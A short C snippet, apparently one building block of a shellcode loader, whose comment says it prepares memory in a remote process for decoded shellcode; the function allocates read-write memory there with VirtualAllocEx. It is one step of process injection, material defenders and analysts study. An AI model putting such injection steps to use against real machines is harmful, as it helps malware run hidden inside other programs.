// Description: Copy decoded shellcode to RW mem in remote process using VirtualAllocEx API
// Used WinAPIs: VirtualAllocEx
// IOCS strings:
LPVOID AllocMemory(HANDLE process, SIZE_T size) {
	LPVOID result = VirtualAllocEx(process, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	#ifdef DEBUG
		if (result == NULL) {
			printf("[-] VirtualAllocEx failed (%d)\n", GetLastError());
		}
	#endif
	return result;
}
